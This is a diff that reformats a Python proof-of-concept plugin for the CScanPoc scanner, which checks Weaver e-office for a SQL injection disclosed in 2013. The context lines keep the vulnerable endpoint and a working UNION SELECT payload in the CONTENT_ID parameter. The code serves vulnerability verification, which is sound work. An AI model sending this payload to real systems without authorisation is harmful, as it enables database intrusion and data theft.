@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'weaver_0052_L' # 平台漏洞编号，留空
+    vuln_id = 'weaver_0052_L'  # 平台漏洞编号，留空
     name = '泛微e-office SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2013-10-11'  # 漏洞公布时间
     desc = '''
         测试官方站点，首先用使用测试账户xj登录，然后访问下面的地址。
@@ -34,9 +35,9 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #根据实际环境payload可能不同
-            #另外需要登录账户测试
+
+            # 根据实际环境payload可能不同
+            # 另外需要登录账户测试
             payload = '/general/file_folder/file_new/neworedit/index.php'
             data = "?FILE_SORT=&CONTENT_ID=-4%20union%20select%201,2,3,4,5,md5(c),7,8,9,10,11,12,13,14,15,16,17,18,19%23&SORT_ID=166&func_id=&operationType=editFromRead&docStr="
             url = self.target + payload + data
@@ -51,6 +52,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
